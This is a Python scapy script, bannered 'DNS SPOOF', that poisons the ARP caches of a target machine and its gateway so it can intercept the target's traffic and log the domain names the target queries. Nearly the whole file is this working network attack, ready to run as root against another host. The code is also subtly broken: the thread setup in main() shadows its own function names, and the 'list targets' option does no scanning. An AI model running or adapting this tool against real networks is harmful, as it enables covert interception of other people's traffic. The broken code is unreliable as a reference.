#!/bin/python3

from scapy.all import ARP, sniff, send, packet, DNS
import argparse as ag
import threading as th
import os
import sys

#-------------------------- functions -----------------------------------------


def colors():
    color = {
    # light colors 
    "red": "\033[0;31m",
    "green": "\033[0;32m",
    "yellow": "\033[0;33m",
    "blue": "\033[0;34m",
    "magenta": "\033[0;35m",
    "cyan": "\033[0;36m",

    # bright colors 
    "bright_red": "\033[0;91m",
    "bright_green": "\033[0;92m",
    "bright_yellow": "\033[0;93m",
    "bright_blue": "\033[0;94m",
    "bright_magenta": "\033[0;95m",
    "bright_cyan": "\033[0;96m",
    }
    return color

def commands():
    parser = ag.ArgumentParser()
    parser.add_argument('-t','--target',dest='target', required = False ,help='Specify the target IP')
    parser.add_argument('-g','--gateway',dest='gateway', required = True ,help='Specify the gateway')
    parser.add_argument('-i','--iface',dest='interface', required = True , help='Specify the interface')
    parser.add_argument('-v','--verbose', dest="verbose", help="Show all DNS", action = 'store_true')
    parser.add_argument('-l', '--ls', dest="listTargets" ,help='List all the target names and IP', action= 'store_true')
    return parser.parse_args()

arguments = commands()
color = colors()

#def dnshake(packet):
    #ignoreDns = ['connectivitycheck.gstatic.com.','init-p01st.push.apple.com.','apple.com.','time-ios.g.aaplimg.com.','www.icloud.com.','www.apple.com.','push.apple.com.']
    #if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 :
    	#dns = packet.getlayer(DNS).qd.qname.decode('utf-8')
    	#if arguments.verbose:
    	#    print(f"[*] Target { arguments.target } has searched for {dns}")
	    #else:
	    #    if dns not in ignoreDns:
         #       print(f"[*] Target { arguments.target } has searched for {dns}")


def dnshake(packet):
    ignoreDns = ['connectivitycheck.gstatic.com.','init-p01st.push.apple.com.','apple.com.','time-ios.g.aaplimg.com.','www.icloud.com.','www.apple.com.','push.apple.com.']  
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        dns = packet.getlayer(DNS).qd.qname.decode('utf-8')
        if arguments.verbose:
            print(f"[*] Target {arguments.target} has searched for {dns}")
        else:
            if dns not in ignoreDns:
                print(f"[*] Target {arguments.target} has searched for {dns}")
              

def target_spoof():
    t_packet = ARP( pdst = arguments.target , psrc = arguments.gateway )
    while True :
        try:
            send(t_packet , verbose = 0 , inter = 2 , loop = 1 )
        except KeyboardInterrupt:
            print(color['bright_red'] + '[-] Terminating ............')
            sys.exit()

def gw_spoof():
    g_packet = ARP( pdst = arguments.gateway , psrc = arguments.target )
    while True:
        try:
            send(g_packet , verbose = 0 , inter = 2 , loop = 1 )
        except KeyboardInterrupt:
            print(color['bright_red'] + '[-] Terminating ............')
            sys.exit()
            
def getname():
    target = arguments.target
    name = 'Unknown'
    arp = os.popen("arp -a").read()
    for arped in arp.split('\n'):
    	info = arped.split()
    	if target in info:
    	    name = info[0]
    	    break
    return name
    	

def printer():
    if arguments.verbose:
        vcolor = color['bright_green']
    else:
        vcolor = color['bright_red']

    print(color['bright_blue'] + '  DNS SPOOF  '.center(60,'='))
    print(color['bright_green'] + f"Target Name : {getname()}")
    print(color['bright_green'] + f"Target IP: {arguments.target}")
    print(color['bright_green'] + f"Gateway : {arguments.gateway}")
    print(color['bright_green'] + f"Interface : {arguments.interface}")
    print(vcolor + f"Verbose : {arguments.verbose}")
    print(color['bright_blue'] + ''.center(60,'='))


def main():
    # t_thread = []
    # gw_thread = []

    if not arguments.target:
        print()
        print(color['bright_yellow'] + "[-] Specify the target IP")
        print()
        return 

    try:
        printer()
        while True:

            target_spoof = th.Thread( target = target_spoof , daemon = True )
            # t_thread.append(target_spoof)
            target_spoof.start()

            gw_spoof = th.Thread( target = gw_spoof , daemon = True )
            # gw_thread.append(gw_spoof)
            gw_spoof.start()

            packet = sniff ( iface = arguments.interface , filter = 'udp port 53', prn = dnshake )

    except KeyboardInterrupt:
        print(color['bright_red'] + '\n[-] Terminating ............')


def checkUser():
    if os.getuid() != 0 :
        print()
        print(color['bright_red'] + '[-] Run spoofer as root user ......\n[-] Quiting ........\n')
        sys.exit()


def pingScan():
    if arguments.verbose:
        print(color['bright_yellow'] + "[*] It uses ICMP scan to get the live hosts \n[*] if it takes a lot of time, use some other tool to get the target IP")

#----------------------------------------------------------------------

checkUser()
if not arguments.listTargets:
    main()
else:
    pingScan()


